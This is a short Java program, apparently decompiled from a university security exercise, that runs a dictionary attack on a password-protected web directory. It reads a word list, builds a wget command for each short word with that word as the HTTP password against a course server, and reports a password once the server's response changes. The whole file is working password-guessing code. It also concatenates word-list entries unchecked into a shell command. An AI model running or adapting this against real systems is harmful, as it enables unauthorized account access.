class Dictionary {
    Dictionary() {
        super();
    }
    public static void main ( String[] a ) {
        try {
            java.io.BufferedReader a0 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.FileReader ( new java.io.File ( "words" ) ) );
            URLHack a1 = new URLHack();
            while ( true ) {
                String s = a0.readLine();
                if ( s == null ) {
                    return;
                }
                if ( s.length() <= 3 ) {
                    URLHack.a ( s );
                }
            }
        } catch ( java.io.IOException a2 ) {
            System.out.println ( new StringBuilder ( "Error: " ).append ( ( Object ) a2 ).toString() );
            return;
        }
    }
}
class URLHack {
    URLHack() {
        super();
    }
    public static void a ( String s ) {
        label1: {
            try {
                String s0 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( Runtime.getRuntime().exec ( new StringBuilder ( "wget -nv --http-user= --http-passwd=" ).append ( s ).append ( " http://sec-crack.cs.rmit.edu./SEC/2/" ).toString() ).getErrorStream() ) ).readLine();
                System.out.println ( s0 );
                int i = s0.length();
                label0: {
                    if ( i == 21 ) {
                        break label0;
                    }
                    System.out.println ( new StringBuilder ( "Password is " ).append ( s ).toString() );
                    System.exit ( 0 );
                    break label1;
                }
                System.out.println ( new StringBuilder ( "Invalid Password " ).append ( s ).toString() );
            } catch ( Exception a ) {
                System.out.println ( new StringBuilder ( " ERROR " ).append ( ( Object ) a ).toString() );
            }
            return;
        }
    }
}
